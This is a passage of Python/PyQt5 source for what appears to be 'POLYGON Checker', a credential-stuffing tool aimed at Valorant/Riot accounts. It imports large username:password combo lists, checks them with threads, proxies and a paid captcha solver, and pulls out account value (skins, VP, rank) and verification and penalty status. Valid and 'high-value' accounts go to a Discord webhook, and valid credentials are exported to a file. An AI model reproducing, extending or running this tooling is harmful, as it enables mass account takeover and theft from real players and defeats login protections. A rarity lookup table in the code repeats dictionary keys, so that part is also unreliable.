            view_all_btn.clicked.connect(lambda checked, c=combo: self._view_all_account_skins(c))
            actions_layout.addWidget(view_all_btn)
            
            actions_layout.addStretch()
            self.skins_table.setCellWidget(row, 5, actions_widget)
    
    def _get_rarity_value(self, rarity_uuid):
        """Get numeric value for rarity sorting (higher = rarer)"""
        # Rarity UUIDs from Valorant (approximate order from common to rare)
        rarity_order = {
            '0cebb8be-46d7-c12a-d306-e99047bfd476': 1,  # Standard
            'e046854e-406c-37f4-6607-19a9ba59df0f': 2,  # Common
            '60bca009-4182-7998-dee7-b8a5ec97c5cb': 3,  # Uncommon
            '12683d76-48d7-84a3-4e09-bb40f9f6c5f2': 4,  # Rare
            '411e4a55-4e59-7757-41c8-3b192c74a575': 5,  # Epic
            'e046854e-406c-37f4-6607-19a9ba59df0f': 6,  # Exotic (duplicate UUID in API)
            '60bca009-4182-7998-dee7-b8a5ec97c5cb': 7,  # Ultra
            '12683d76-48d7-84a3-4e09-bb40f9f6c5f2': 8,  # Exclusive
            '411e4a55-4e59-7757-41c8-3b192c74a575': 9,  # Premium
        }
        return rarity_order.get(rarity_uuid, 0) if rarity_uuid else 0
    
    def _load_skin_image_async(self, label, image_url, size=60):
        """Load skin image from URL using QNetworkAccessManager (same as test script)
        
        Args:
            label: QLabel to display the image
            image_url: URL of the image to load
            size: Size to scale the image to (default 60 for table view, use 190 for dialog cards)
        """
        # Validate URL first
        if not image_url or not isinstance(image_url, str) or not image_url.strip():
            label.setText("No URL")
            label.setAlignment(Qt.AlignCenter)
            return
        
        image_url = image_url.strip()
        if not (image_url.startswith('http://') or image_url.startswith('https://')):
            label.setText("Invalid URL")
            label.setAlignment(Qt.AlignCenter)
            return
        
        # Show placeholder first
        label.setText("...")
        label.setAlignment(Qt.AlignCenter)
        
        # Use shared network manager (same as test script - must persist to avoid garbage collection)
        # Use lambda to capture label and size - each connection is independent
        # This allows multiple images to load simultaneously without interfering
        self.network_manager.finished.connect(
            lambda reply, lbl=label, sz=size: self._handle_image_download(reply, lbl, sz)
        )
        request = QNetworkRequest(QUrl(image_url))
        self.network_manager.get(request)
    
    def _handle_image_download(self, reply, label, size):
        """Handle image download completion (same logic as test script) - shared handler"""
        try:
            if reply.error() == QNetworkReply.NoError:
                data = reply.readAll()
                pixmap = QPixmap()
                if pixmap.loadFromData(data) and not pixmap.isNull():
                    # Scale to fit specified size while maintaining aspect ratio
                    scaled_pixmap = pixmap.scaled(size, size, Qt.KeepAspectRatio, Qt.SmoothTransformation)
                    label.setPixmap(scaled_pixmap)
                    label.setText("")  # Clear placeholder text
                else:
                    label.setText("Load Failed")
                    label.setAlignment(Qt.AlignCenter)
            else:
                label.setText("Network Error")
                label.setAlignment(Qt.AlignCenter)
                try:
                    _LOGGER.debug(f"Network error: {reply.errorString()}")
                except:
                    pass
        except Exception as e:
            try:
                _LOGGER.debug(f"Image load error: {e}")
            except:
                pass
            label.setText("Error")
            label.setAlignment(Qt.AlignCenter)
        finally:
            reply.deleteLater()
    
    def _set_skin_image(self, label, image_data, size=60):
        """Set skin image to label (called from main thread) - kept for compatibility"""
        # This method is kept for backward compatibility but images now load via QNetworkAccessManager
        try:
            pixmap = QPixmap()
            if pixmap.loadFromData(image_data):
                # Validate pixmap is not null
                if not pixmap.isNull():
                    # Scale to fit specified size while maintaining aspect ratio
                    scaled_pixmap = pixmap.scaled(size, size, Qt.KeepAspectRatio, Qt.SmoothTransformation)
                    label.setPixmap(scaled_pixmap)
                    label.setText("")  # Clear placeholder text
                else:
                    label.setText("Null pixmap")
                    label.setAlignment(Qt.AlignCenter)
            else:
                label.setText("Load failed")
                label.setAlignment(Qt.AlignCenter)
        except Exception as e:
            try:
                _LOGGER.debug(f"Set image error: {e}")
            except:
                pass
            label.setText("Error")
            label.setAlignment(Qt.AlignCenter)
    
    def _view_account_skins(self, combo_data):
        """View skins for a single account (opens skin list dialog)"""
        username = combo_data.get('username', 'Unknown')
        self._show_skin_list_dialog(username, combo_data)
    
    def _view_all_account_skins(self, combo_data):
        """View all skins for an account (opens skin list dialog with all skins tab)"""
        username = combo_data.get('username', 'Unknown')
        self._show_skin_list_dialog(username, combo_data, default_tab='all_skins')
    
    def _create_skins_image_tab_for_dialog(self, skin_details):
        """Create a tab displaying skins as images in a grid layout (for PolygonCheckerUI dialogs)"""
        from PyQt5.QtWidgets import QWidget, QVBoxLayout, QScrollArea, QGridLayout, QLabel
        from PyQt5.QtGui import QPixmap
        
        widget = QWidget()
        main_layout = QVBoxLayout()
        widget.setLayout(main_layout)
        
        if not skin_details:
            label = QLabel("No skins available")
            label.setAlignment(Qt.AlignCenter)
            main_layout.addWidget(label)
            return widget
        
        # Create scroll area for the grid
        scroll_area = QScrollArea()
        scroll_area.setWidgetResizable(True)
        scroll_area.setStyleSheet("QScrollArea { border: none; }")
        
        # Container widget for the grid
        grid_widget = QWidget()
        grid_layout = QGridLayout()
        grid_widget.setLayout(grid_layout)
        grid_layout.setSpacing(15)
        
        # Create skin cards in grid
        cols = 4  # Number of columns in the grid
        for idx, skin in enumerate(skin_details):
            row = idx // cols
            col = idx % cols
            
            # Create card widget
            card = QWidget()
            card.setFixedSize(200, 250)
            card.setStyleSheet("""
                QWidget {
                    background-color: #2b2b2b;
                    border: 1px solid #3d3d3d;
                    border-radius: 8px;
                }
            """)
            card_layout = QVBoxLayout()
            card_layout.setContentsMargins(5, 5, 5, 5)
            card_layout.setSpacing(5)
            card.setLayout(card_layout)
            
            # Image label
            image_label = QLabel()
            image_label.setFixedSize(190, 190)
            image_label.setAlignment(Qt.AlignCenter)
            image_label.setStyleSheet("""
                QLabel {
                    background-color: #1e1e1e;
                    border: 1px solid #3d3d3d;
                    border-radius: 4px;
                }
            """)
            image_label.setText("Loading...")
            
            # Name label
            name_label = QLabel()
            name_label.setAlignment(Qt.AlignCenter)
            name_label.setWordWrap(True)
            name_label.setStyleSheet("color: #ffffff; font-size: 11px;")
            skin_name = skin.get('name', 'Unknown Skin')
            weapon_name = skin.get('weapon', 'Unknown')
            name_label.setText(f"{skin_name}\n({weapon_name})")
            
            card_layout.addWidget(image_label)
            card_layout.addWidget(name_label)
            
            # Load image asynchronously (using requests + threading, no UI blocking)
            image_url = skin.get('image_url')
            if image_url:
                # Use async loading to avoid blocking UI (190x190 for dialog cards)
                self._load_skin_image_async(image_label, image_url, size=190)
            else:
                image_label.setText("No URL")
            
            grid_layout.addWidget(card, row, col)
        
        scroll_area.setWidget(grid_widget)
        main_layout.addWidget(scroll_area)
        
        return widget
    
    def _show_skin_list_dialog(self, username, combo_data, default_tab='equipped'):
        """Show skin list dialog with full features (images, statistics, etc.)"""
        # Import MainWindow methods if available, otherwise create simplified version
        try:
            # Try to use MainWindow's dialog creation method
            # Create a temporary MainWindow instance to access its methods
            from PyQt5.QtWidgets import QDialog, QVBoxLayout, QHBoxLayout, QPushButton, QLabel, QTabWidget, QTextEdit
            from PyQt5.QtGui import QFont
            
            dialog = QDialog(self)
            dialog.setWindowTitle(f"Cosmetics - {username}")
            dialog.setGeometry(200, 200, 1200, 800)
            dialog.setStyleSheet(self.styleSheet())
            layout = QVBoxLayout()
            dialog.setLayout(layout)
            
            title_label = QLabel(f"Cosmetics for {username}")
            title_label.setFont(QFont("Arial", 14, QFont.Bold))
            layout.addWidget(title_label)
            
            tab_widget = QTabWidget()
            skin_details = combo_data.get('skin_details', [])
            weapon_skins = combo_data.get('weapon_skins', [])
            buddies = combo_data.get('buddies', [])
            player_cards = combo_data.get('player_cards', [])
            sprays = combo_data.get('sprays', [])
            
            # Create tabs using MainWindow's methods if we can access them
            # For now, create enhanced tabs with better display
            from PyQt5.QtWidgets import QTableWidget, QTableWidgetItem, QHeaderView
            
            # Equipped Skins Tab with Images (async loading)
            if skin_details:
                equipped_images_tab = self._create_skins_image_tab_for_dialog(skin_details)
                tab_widget.addTab(equipped_images_tab, f"Equipped Skins ({len(skin_details)})")
            
            # All Skins Tab with Images (async loading)
            if weapon_skins:
                all_skins_images_tab = self._create_skins_image_tab_for_dialog(weapon_skins)
                tab_widget.addTab(all_skins_images_tab, f"All Skins ({len(weapon_skins)})")
            
            # Set default tab
            if default_tab == 'all_skins' and len(weapon_skins) > 0:
                tab_widget.setCurrentIndex(1)
            elif len(skin_details) > 0:
                tab_widget.setCurrentIndex(0)
            
            layout.addWidget(tab_widget)
            
            button_layout = QHBoxLayout()
            close_btn = QPushButton("Close")
            close_btn.clicked.connect(dialog.close)
            button_layout.addWidget(close_btn)
            layout.addLayout(button_layout)
            dialog.exec_()
        except Exception as e:
            # Fallback to simple text display
            QMessageBox.warning(self, "Error", f"Could not display skins dialog: {e}")
    
    def _create_skins_tab(self, skin_details):
        """Create a tab widget displaying skins in a table"""
        widget = QWidget()
        layout = QVBoxLayout()
        widget.setLayout(layout)
        if not skin_details:
            label = QLabel("No skins available")
            label.setAlignment(Qt.AlignCenter)
            layout.addWidget(label)
            return widget
        table = QTableWidget()
        table.setColumnCount(3)
        table.setHorizontalHeaderLabels(["Skin Name", "Weapon", "Rarity"])
        table.setEditTriggers(QAbstractItemView.NoEditTriggers)
        table.setSelectionBehavior(QAbstractItemView.SelectRows)
        table.setRowCount(len(skin_details))
        for row, skin in enumerate(skin_details):
            skin_name = skin.get('name', 'Unknown Skin') if isinstance(skin, dict) else str(skin)
            weapon_name = skin.get('weapon', 'Unknown') if isinstance(skin, dict) else 'Unknown'
            rarity = skin.get('rarity', 'Unknown') if isinstance(skin, dict) else 'Unknown'
            table.setItem(row, 0, QTableWidgetItem(skin_name))
            table.setItem(row, 1, QTableWidgetItem(weapon_name))
            table.setItem(row, 2, QTableWidgetItem(rarity))
        header = table.horizontalHeader()
        for i in range(3):
            header.setSectionResizeMode(i, QHeaderView.Stretch)
        layout.addWidget(table)
        return widget
    
    def _create_account_info_tab(self, combo_data):
        """Create account info tab with detailed information"""
        widget = QWidget()
        layout = QVBoxLayout()
        widget.setLayout(layout)
        info_label = QLabel("Account Information")
        info_label.setFont(QFont("Arial", 12, QFont.Bold))
        layout.addWidget(info_label)
        info_text = QTextEdit()
        info_text.setReadOnly(True)
        info_lines = []
        info_lines.append("=== VERIFICATION STATUS ===")
        info_lines.append(f"Email: {combo_data.get('email_status', 'UNKNOWN')}")
        info_lines.append(f"Phone: {combo_data.get('phone_status', 'UNKNOWN')}")
        info_lines.append("")
        info_lines.append("=== MATCH HISTORY ===")
        total_matches = combo_data.get('total_matches', 0)
        info_lines.append(f"Total Matches Played: {total_matches}")
        recent_matches = combo_data.get('recent_matches', [])
        if recent_matches:
            info_lines.append(f"Recent Matches: {len(recent_matches)}")
            for i, match in enumerate(recent_matches[:5], 1):
                match_id = match.get('match_id', 'Unknown')[:8] if isinstance(match, dict) else str(match)[:8]
                queue = match.get('queue_id', 'Unknown') if isinstance(match, dict) else 'Unknown'
                info_lines.append(f"  {i}. Match {match_id}... - Queue: {queue}")
        else:
            info_lines.append("No recent match data available")
        info_lines.append("")
        info_lines.append("=== ACCOUNT RESTRICTIONS ===")
        penalty_status = combo_data.get('penalty_status', 'UNKNOWN')
        has_penalties = combo_data.get('has_penalties', False)
        if has_penalties:
            info_lines.append(f"Status: {penalty_status}")
            penalties = combo_data.get('penalties', [])
            if penalties:
                info_lines.append(f"Active Penalties: {len(penalties)}")
                for i, penalty in enumerate(penalties, 1):
                    penalty_type = penalty.get('Type', 'Unknown') if isinstance(penalty, dict) else str(penalty)
                    info_lines.append(f"  {i}. Type: {penalty_type}")
        else:
            info_lines.append(f"Status: {penalty_status}")
        info_lines.append("")
        info_lines.append("=== COSMETICS SUMMARY ===")
        info_lines.append(f"Equipped Skins: {combo_data.get('skins', 0)}")
        info_lines.append(f"All Weapon Skins: {combo_data.get('weapon_skins_count', 0)}")
        info_lines.append(f"Skin Chromas: {combo_data.get('skin_chromas_count', 0)}")
        info_lines.append(f"Skin Levels: {combo_data.get('skin_levels_count', 0)}")
        info_lines.append(f"Buddies: {combo_data.get('buddies_count', 0)}")
        info_lines.append(f"Player Cards: {combo_data.get('player_cards_count', 0)}")
        info_lines.append(f"Sprays: {combo_data.get('sprays_count', 0)}")
        info_lines.append("")
        info_lines.append("=== ACCOUNT DETAILS ===")
        info_lines.append(f"Riot ID: {combo_data.get('riot_id', 'Unknown')}")
        info_lines.append(f"Region: {combo_data.get('region', 'Unknown')}")
        info_lines.append(f"Country: {combo_data.get('country', 'Unknown')}")
        info_lines.append(f"Level: {combo_data.get('level', 0)}")
        info_lines.append(f"Rank: {combo_data.get('rank', 'Unranked')}")
        info_lines.append(f"Agents: {combo_data.get('agents', 0)}")
        info_lines.append(f"VP: {combo_data.get('vp', 0)}")
        info_lines.append(f"RD: {combo_data.get('rd', 0)}")
        info_lines.append(f"KC: {combo_data.get('kc', 0)}")
        info_text.setText('\n'.join(info_lines))
        layout.addWidget(info_text)
        return widget

    def on_load_combos(self):
        path, _ = QFileDialog.getOpenFileName(self, "Select combos file", "", "Text files (*.txt);;All files (*.*)")
        if not path:
            return
        try:
            # Stream file reading - NO SIZE LIMITS, handle any size gracefully
            total_added = 0
            total_lines = 0
            invalid_lines = 0
            BATCH_SIZE = 1000  # Larger batches for better performance
            current_batch = []
            
            # Try multiple encodings
            encodings = ['utf-8', 'utf-8-sig', 'latin-1', 'cp1252', 'iso-8859-1']
            file_handle = None
            encoding_used = None
            
            for enc in encodings:
                try:
                    file_handle = open(path, "r", encoding=enc, errors="ignore")
                    file_handle.readline()  # Test read
                    file_handle.seek(0)
                    encoding_used = enc
                    break
                except Exception:
                    if file_handle:
                        try:
                            file_handle.close()
                        except:
                            pass
                    file_handle = None
                    continue
            
            if not file_handle:
                try:
                    QMessageBox.critical(self, "Error", "Could not read file with any supported encoding")
                except:
                    pass
                return
            
            try:
                # Stream process the file - NO LINE LIMITS
                line_count = 0
                last_progress_update = 0
                
                for line in file_handle:
                    line_count += 1
                    total_lines += 1
                    
                    # Process UI events periodically (less frequently for better performance)
                    if line_count % 5000 == 0:  # Reduced frequency from 1000 to 5000
                        QApplication.processEvents()
                    
                    try:
                        stripped = line.strip()
                        if not stripped or stripped.startswith('#') or stripped.startswith('//'):
                            continue
                        
                        # Support multiple separators
                        separator = None
                        if ':' in stripped:
                            separator = ':'
                        elif '|' in stripped:
                            separator = '|'
                        elif ';' in stripped:
                            separator = ';'
                        
                        if separator:
                            parts = stripped.split(separator, 1)
                            if len(parts) == 2:
                                user = parts[0].strip()
                                pwd = parts[1].strip()
                                if user and pwd:
                                    current_batch.append((user, pwd))
                                    
                                    # Process batch when it reaches size
                                    if len(current_batch) >= BATCH_SIZE:
                                        try:
                                            added, _ = self._storage.add_combos(current_batch)
                                            total_added += added
                                            current_batch = []
                                            
                                            # Update progress every 10 batches
                                            if line_count % (BATCH_SIZE * 10) == 0:
                                                try:
                                                    self.add_log_entry(f"Processing... {total_added} combos added so far...", "INFO")
                                                except:
                                                    pass
                                                QApplication.processEvents()
                                        except Exception as e:
                                            # Log but continue - never crash
                                            try:
                                                self.add_log_entry(f"Error processing batch: {e}", "ERROR")
                                            except:
                                                pass
                                            current_batch = []
                                            continue
                                else:
                                    invalid_lines += 1
                            else:
                                invalid_lines += 1
                        else:
                            invalid_lines += 1
                    except Exception as e:
                        # Log but continue processing
                        invalid_lines += 1
                        try:
                            if line_count % 10000 == 0:  # Only log occasionally
                                self.add_log_entry(f"Error parsing line {line_count}: {e}", "WARNING")
                        except:
                            pass
                        continue
            
                # Process remaining batch
                if current_batch:
                    try:
                        added, _ = self._storage.add_combos(current_batch)
                        total_added += added
                    except Exception as e:
                        try:
                            self.add_log_entry(f"Error processing final batch: {e}", "ERROR")
                        except:
                            pass
                
                # Show completion message
                try:
                    if total_added > 0:
                        QMessageBox.information(self, "Combos Imported", 
                            f"Successfully added: {total_added} combos\n"
                            f"Total lines processed: {total_lines}\n"
                            f"Invalid/skipped lines: {invalid_lines}\n"
                            f"Encoding: {encoding_used}")
                        self.add_log_entry(f"Loaded {total_added} combos from file", "INFO")
                    else:
                        QMessageBox.warning(self, "No Valid Combos", 
                            f"No valid combos found in file.\n"
                            f"Total lines processed: {total_lines}\n"
                            f"Invalid/skipped lines: {invalid_lines}")
                except Exception as e:
                    # Even message box can fail, just log
                    try:
                        self.add_log_entry(f"Loaded {total_added} combos (message display failed: {e})", "INFO")
                    except:
                        pass
                
                # Disable refresh temporarily to prevent lag during import
                try:
                    self.refresh_timer.stop()
                    self.refresh()
                    # Restart with longer interval if large dataset
                    if total_added > 1000:
                        self.refresh_timer.start(5000)  # 5 seconds for large datasets
                    else:
                        self.refresh_timer.start(3000)  # 3 seconds for normal datasets
                except:
                    pass  # Continue even if refresh fails
            finally:
                try:
                    file_handle.close()
                except:
                    pass
            
        except MemoryError as e:
            # Handle memory errors gracefully - process in smaller chunks if needed
            # Don't show error to user - just log and continue silently
            try:
                self.add_log_entry(f"Processing large file, using memory optimization...", "INFO")
                # Try to continue with smaller batch size
                if current_batch:
                    try:
                        # Process what we have so far
                        added, _ = self._storage.add_combos(current_batch)
                        total_added += added
                        try:
                            self.add_log_entry(f"Processed {total_added} combos before memory optimization", "INFO")
                        except:
                            pass
                    except:
                        pass
            except:
                pass
        except Exception as e:
            # Comprehensive error handling - never crash
            try:
                QMessageBox.critical(self, "Error", f"Failed to load combos:\n{str(e)}")
            except:
                pass
            try:
                self.add_log_entry(f"Error loading combos: {e}", "ERROR")
            except:
                pass

    def on_start(self):
        try:
            # Align logic with valo.py: only require API key if using captcha
            api_key = self.api_key_input.text().strip()
            if api_key:
                _SOLVER.api_key = api_key
                _CHECKER.use_captcha_solver = True
                try:
                    if save_config():
                        _LOGGER.log("API key saved successfully", "INFO")
                    else:
                        _LOGGER.log("Warning: Failed to save API key", "WARN")
                except Exception as e:
                    _LOGGER.log(f"Warning: Could not save API key: {e}", "WARN")
            else:
                # No API key provided: run without captcha solver
                _CHECKER.use_captcha_solver = False

            threads = int(self.thread_spin.value())
            # Ensure any previous mid-flight combos are reset
            self._storage.reset_checking_combos()
            # Load proxies from text area if provided
            self.load_proxies_from_text()
            self._checker.start_checking(threads)
            self.start_btn.setEnabled(False)
        except Exception as e:
            QMessageBox.critical(self, "Error", f"Failed to start checker:\n{e}")

    def on_pause(self):
        try:
            self._checker.stop_checking()
            self.start_btn.setEnabled(True)
        except Exception as e:
            QMessageBox.critical(self, "Error", f"Failed to pause checker:\n{e}")

    def on_export(self, fmt: str):
        try:
            combos = self._storage.get_all_combos()
            if fmt == "json":
                path, _ = QFileDialog.getSaveFileName(self, "Export JSON", "results.json", "JSON (*.json)")
                if not path:
                    return
                import json
                with open(path, "w", encoding="utf-8") as f:
                    json.dump(combos, f, ensure_ascii=False, indent=2, default=str)
                QMessageBox.information(self, "Export", "Exported JSON successfully.")
            elif fmt == "csv":
                path, _ = QFileDialog.getSaveFileName(self, "Export CSV", "results.csv", "CSV (*.csv)")
                if not path:
                    return
                import csv
                with open(path, "w", encoding="utf-8", newline="") as f:
                    writer = csv.writer(f)
                    writer.writerow([
                        "Username",
                        "Password",
                        "Status",
                        "RiotID",
                        "Level",
                        "VP",
                        "RD",
                        "Rank",
                        "Country",
                    ])
                    for c in combos:
                        writer.writerow([
                            c.get("username", ""),
                            c.get("password", ""),
                            c.get("status", ""),
                            c.get("riot_id", ""),
                            c.get("level", 0),
                            c.get("vp", 0),
                            c.get("rd", 0),
                            c.get("rank", ""),
                            c.get("country", ""),
                        ])
                QMessageBox.information(self, "Export", "Exported CSV successfully.")
            elif fmt == "txt":
                path, _ = QFileDialog.getSaveFileName(self, "Export TXT (valid only)", "valid.txt", "Text (*.txt)")
                if not path:
                    return
                valid_lines = [f"{c.get('username','')}:{c.get('password','')}" for c in combos if c.get("status") == "valid"]
                with open(path, "w", encoding="utf-8") as f:
                    f.write("\n".join(valid_lines))
                QMessageBox.information(self, "Export", "Exported TXT successfully.")
        except Exception as e:
            QMessageBox.critical(self, "Error", f"Export failed:\n{e}")

    def refresh(self):
        # Throttle refreshes to prevent excessive updates
        current_time = _time.time() * 1000  # Convert to milliseconds
        if current_time - self._last_refresh_time < self._refresh_throttle_ms:
            return  # Skip this refresh if too soon
        self._last_refresh_time = current_time
        
        try:
            # Update stats/cards
            stats = self._storage.get_statistics()
            total = stats.get('total', 0)
            checked = stats.get('checked', 0)
            valid = stats.get('valid', 0)
            invalid = stats.get('invalid', 0)
            self.card_total.set_value(str(total))
            self.card_checked.set_value(str(checked))
            self.card_valid.set_value(str(valid))
            self.card_invalid.set_value(str(invalid))
            
            # Update progress bar
            if total > 0:
                progress = int((checked / total) * 100)
                self.progress_bar.setMaximum(total)
                self.progress_bar.setValue(checked)
            else:
                self.progress_bar.setValue(0)
            
            # Update CPM display - get from checker directly
            cpm = 0
            if self._checker.is_running:
                with self._checker.cpm_lock:
                    if self._checker.check_times:
                        time_span = self._checker.check_times[-1] - self._checker.check_times[0] if len(self._checker.check_times) > 1 else 1
                        cpm = int(len(self._checker.check_times) / max(time_span / 60, 0.0167))
            self.cpm_label.setText(f"CPM: {cpm}")

            # Adaptive refresh - skip table refresh for very large datasets to prevent lag
            # Only refresh table if dataset is manageable or if explicitly needed
            if total > 1000:
                # For large datasets, refresh table less frequently (every 5th call = ~25 seconds)
                if not hasattr(self, '_table_refresh_counter'):
                    self._table_refresh_counter = 0
                self._table_refresh_counter += 1
                # Only refresh table every 5th call for large datasets (optimized from 3rd)
                if self._table_refresh_counter >= 5:
                    self._table_refresh_counter = 0
                    self._refresh_table_optimized()
            elif total > 500:
                # Medium datasets: refresh every 3rd call (~15 seconds)
                if not hasattr(self, '_table_refresh_counter'):
                    self._table_refresh_counter = 0
                self._table_refresh_counter += 1
                if self._table_refresh_counter >= 3:
                    self._table_refresh_counter = 0
                    self._refresh_table_optimized()
            else:
                # Normal refresh for smaller datasets
                self._refresh_table_optimized()

            # Update button states
            self.start_btn.setEnabled(not self._checker.is_running)
        except Exception as e:
            # Prevent crashes from refresh errors
            _LOGGER.log(f"Error in refresh: {e}", "ERROR")

    def on_check_balance(self):
        try:
            # Get API key from input field first
            api_key = self.api_key_input.text().strip()
            if not api_key:
                QMessageBox.warning(self, "Captcha Balance", "Please enter your Captcha Solver API key first.")
                _LOGGER.log("Captcha API key not provided; cannot check balance.", "WARN")
                return
            
            # Update solver with the API key from input
            _SOLVER.api_key = api_key
            
            # Save the API key to config
            try:
                save_config()
                _LOGGER.log("API key saved successfully", "INFO")
            except Exception as e:
                _LOGGER.log(f"Warning: Could not save API key: {e}", "WARN")
            
            _LOGGER.log("Checking captcha solver balance…", "INFO")
            balance = _SOLVER.get_balance()
            if balance is None:
                _LOGGER.log("Failed to fetch balance. Check your API key and network.", "ERROR")
                QMessageBox.warning(self, "Captcha Balance", "Failed to fetch balance. Please verify your API key and try again.")
                return
            try:
                self.balance_label.setText(f"Balance: ${float(balance):.2f}")
            except Exception:
                self.balance_label.setText(f"Balance: ${balance}")
            _LOGGER.log(f"Captcha balance: ${balance}", "INFO")
        except Exception as e:
            _LOGGER.log(f"Error checking balance: {e}", "ERROR")
            QMessageBox.critical(self, "Captcha Balance", f"Error checking balance: {e}")
    
    def on_show_settings(self):
        """Show settings dialog with webhook and other configuration options"""
        dialog = QDialog(self)
        dialog.setWindowTitle("Settings")
        dialog.setGeometry(200, 200, 700, 800)
        dialog.setStyleSheet(self.styleSheet())
        
        layout = QVBoxLayout()
        layout.setSpacing(15)
        layout.setContentsMargins(20, 20, 20, 20)
        dialog.setLayout(layout)
        
        # Title
        title_label = QLabel("Settings")
        title_label.setFont(QFont("Arial", 18, QFont.Bold))
        title_label.setAlignment(Qt.AlignCenter)
        title_label.setStyleSheet("padding: 10px; margin-bottom: 10px;")
        layout.addWidget(title_label)
        
        # Tab widget for better organization
        tab_widget = QTabWidget()
        tab_widget.setStyleSheet("""
            QTabWidget::pane {
                border: 1px solid #555;
                border-radius: 5px;
                background-color: #2b2b2b;
                padding: 10px;
            }
            QTabBar::tab {
                background-color: #3d3d3d;
                color: white;
                padding: 10px 20px;
                margin-right: 2px;
                border-top-left-radius: 5px;
                border-top-right-radius: 5px;
            }
            QTabBar::tab:selected {
                background-color: #2b2b2b;
                border-bottom: 2px solid #ff3b3b;
            }
            QTabBar::tab:hover {
                background-color: #4d4d4d;
            }
        """)
        
        # Webhook Tab
        webhook_tab = QWidget()
        webhook_layout = QVBoxLayout()
        webhook_layout.setSpacing(15)
        webhook_layout.setContentsMargins(20, 20, 20, 20)
        webhook_tab.setLayout(webhook_layout)
        
        from PyQt5.QtWidgets import QCheckBox, QLabel as QLabel2, QFormLayout
        
        # Section header
        webhook_header = QLabel("Discord Webhook Configuration")
        webhook_header.setFont(QFont("Arial", 12, QFont.Bold))
        webhook_layout.addWidget(webhook_header)
        
        # Use form layout for better alignment
        webhook_form = QFormLayout()
        webhook_form.setSpacing(12)
        webhook_form.setLabelAlignment(Qt.AlignRight)
        
        webhook_enabled = QCheckBox("Enable Webhook Notifications")
        webhook_enabled.setChecked(WEBHOOK_CONFIG.get('enabled', False))
        webhook_enabled.setToolTip("Enable or disable Discord webhook notifications")
        webhook_form.addRow("", webhook_enabled)
        
        webhook_url_label = QLabel2("Webhook URL:")
        webhook_url_label.setToolTip("Your Discord webhook URL (get it from Discord server settings)")
        webhook_url_input = QLineEdit()
        webhook_url_input.setText(WEBHOOK_CONFIG.get('url', ''))
        webhook_url_input.setPlaceholderText("https://discord.com/api/webhooks/...")
        webhook_url_input.setToolTip("Enter your Discord webhook URL here")
        webhook_form.addRow(webhook_url_label, webhook_url_input)
        
        webhook_username_label = QLabel2("Webhook Username:")
        webhook_username_label.setToolTip("The name that will appear in Discord messages")
        webhook_username_input = QLineEdit()
        webhook_username_input.setText(WEBHOOK_CONFIG.get('username', 'POLYGON Checker'))
        webhook_username_input.setToolTip("Customize the bot name for webhook messages")
        webhook_form.addRow(webhook_username_label, webhook_username_input)
        
        webhook_layout.addLayout(webhook_form)
        
        # Notification options section
        webhook_options_header = QLabel("Notification Options")
        webhook_options_header.setFont(QFont("Arial", 11, QFont.Bold))
        webhook_options_header.setStyleSheet("margin-top: 10px;")
        webhook_layout.addWidget(webhook_options_header)
        
        webhook_on_valid = QCheckBox("Send notification when valid account is found")
        webhook_on_valid.setChecked(WEBHOOK_CONFIG.get('on_valid', True))
        webhook_on_valid.setToolTip("Receive a notification for every valid account")
        webhook_layout.addWidget(webhook_on_valid)
        
        webhook_on_banned = QCheckBox("Send notification when banned account is detected")
        webhook_on_banned.setChecked(WEBHOOK_CONFIG.get('on_banned', False))
        webhook_on_banned.setToolTip("Receive a notification when a banned account is found")
        webhook_layout.addWidget(webhook_on_banned)
        
        webhook_on_high_value = QCheckBox("Send notification for high-value accounts (50+ skins)")
        webhook_on_high_value.setChecked(WEBHOOK_CONFIG.get('on_high_value', True))
        webhook_on_high_value.setToolTip("Get notified about accounts with 50 or more skins")
        webhook_layout.addWidget(webhook_on_high_value)
        
        webhook_layout.addStretch()
        tab_widget.addTab(webhook_tab, "Webhook")
        
        # API Key Tab
        api_tab = QWidget()
        api_layout = QVBoxLayout()
        api_layout.setSpacing(15)
        api_layout.setContentsMargins(20, 20, 20, 20)
        api_tab.setLayout(api_layout)
        
        api_header = QLabel("API Key Configuration")
        api_header.setFont(QFont("Arial", 12, QFont.Bold))
        api_layout.addWidget(api_header)
        
        api_info = QLabel("Enter your Captcha Solver API key below. This key is used to solve CAPTCHAs during account checking.")
        api_info.setWordWrap(True)
        api_info.setStyleSheet("padding: 10px; background-color: #3d3d3d; border-radius: 5px;")
        api_layout.addWidget(api_info)
        
        api_form = QFormLayout()
        api_form.setSpacing(12)
        api_form.setLabelAlignment(Qt.AlignRight)
        
        api_key_label = QLabel2("API Key:")
        api_key_label.setToolTip("Your Captcha Solver service API key")
        api_key_input_dialog = QLineEdit()
        api_key_input_dialog.setEchoMode(QLineEdit.Password)
        api_key_input_dialog.setText(_SOLVER.api_key if hasattr(_SOLVER, 'api_key') else '')
        api_key_input_dialog.setPlaceholderText("Enter your API key...")
        api_key_input_dialog.setToolTip("Enter your Captcha Solver API key (hidden for security)")
        api_form.addRow(api_key_label, api_key_input_dialog)
        
        api_layout.addLayout(api_form)
        api_layout.addStretch()
        tab_widget.addTab(api_tab, "API Key")
        
        # Misc Tab
        misc_tab = QWidget()
        misc_layout = QVBoxLayout()
        misc_layout.setSpacing(15)
        misc_layout.setContentsMargins(20, 20, 20, 20)
        misc_tab.setLayout(misc_layout)
        
        misc_header = QLabel("Miscellaneous Settings")
        misc_header.setFont(QFont("Arial", 12, QFont.Bold))
        misc_layout.addWidget(misc_header)
        
        # Show JSON in FullCaptureDetails toggle
        show_json_checkbox = QCheckBox("Show JSON in FullCaptureDetails")
        show_json_checkbox.setChecked(SETTINGS.get('show_json_in_full_capture', False))
        show_json_checkbox.setToolTip("When enabled, the FullCaptureDetails file will include a JSON section with all remaining fields")
        misc_layout.addWidget(show_json_checkbox)
        
        misc_layout.addStretch()
        
        # Made By Polygon section
        polygon_label = QLabel("Made By Polygon")
        polygon_label.setFont(QFont("Arial", 10, QFont.Bold))
        polygon_label.setAlignment(Qt.AlignCenter)
        polygon_label.setStyleSheet("padding: 10px; margin-top: 20px;")
        misc_layout.addWidget(polygon_label)
        
        discord_label = QLabel('<a href="https://discord.gg/BmPKXpbYHK">https://discord.gg/BmPKXpbYHK</a>')
        discord_label.setOpenExternalLinks(True)
        discord_label.setAlignment(Qt.AlignCenter)
        discord_label.setStyleSheet("padding: 5px; color: #4A9EFF;")
        misc_layout.addWidget(discord_label)
        
        misc_layout.addStretch()
        tab_widget.addTab(misc_tab, "Misc")
        
        layout.addWidget(tab_widget)
        
        # Buttons with better styling
        button_layout = QHBoxLayout()
        button_layout.setSpacing(10)
        button_layout.addStretch()
        
